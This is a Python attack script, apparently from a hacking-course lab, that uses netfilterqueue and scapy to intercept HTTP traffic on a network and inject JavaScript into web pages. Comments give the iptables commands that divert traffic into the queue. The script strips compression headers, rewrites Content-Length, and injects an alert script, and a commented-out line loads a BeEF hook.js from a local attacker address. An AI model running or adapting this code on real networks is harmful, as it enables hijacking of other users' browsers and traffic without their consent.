import netfilterqueue
import scapy.all as scapy
import re

#apt-get install python-netfilterqueue
#pip install Cython --install-option="--no-cython-compile"
#apt-get install build-essential python-dev libnetfilter-queue-dev
#iptables -I FORWARD -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables --flush

target_website = "www.bing.com"
server_ip = "10.0.2.5"

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print("HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
            #print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 10000:
            print ("HTTP Response")
            print(scapy_packet.show())
            #injection_code = '<script src="http://10.0.2.5:3000/hook.js"></script>'
            injection_code = "<script>alert('test');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet)) #Content-Length:\s\d*

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()